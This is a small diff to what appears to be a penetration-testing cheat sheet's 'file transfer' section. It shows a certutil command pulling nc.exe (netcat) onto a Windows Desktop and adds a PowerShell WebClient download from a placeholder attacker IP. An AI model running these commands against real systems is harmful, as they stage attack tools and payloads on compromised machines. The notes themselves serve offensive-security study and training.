@@ -34,4 +34,5 @@ file transfer
 
 ```cmd
 certutil -urlcache -split -f "http://<target ip>/nc.exe" C:\Users\<User Account>\Desktop\nc.exe
+PowerShell -c "(new-object System.Net.WebClient).DownloadFile('http://<attacker ip>/test.txt', '<file_name>')"
 ```
